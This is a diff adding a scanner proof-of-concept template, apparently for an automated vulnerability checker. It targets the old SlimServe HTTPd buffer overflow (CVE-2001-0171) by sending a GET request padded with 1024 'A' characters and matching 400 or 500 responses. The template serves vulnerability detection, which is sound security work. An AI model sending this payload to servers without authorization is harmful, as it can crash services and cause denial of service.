@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "通过发送超长 GET 请求验证 SlimServe HTTPd 的缓冲区溢出漏洞。若目标易受影响，服务器将因处理过长请求而崩溃或返回异常。"
+id = "POC-AVE-2001-0065"
+name = "WhitSoft SlimServe HTTPd Buffer Overflow PoC"
+severity = "critical"
+tags = ["ave-2001-0065"]
+vuln_id = [
+    "CVE-2001-0171",
+    "AVE-2001-0065",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{Repeat('A', 1024)}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    400,
+]
+type = "status"
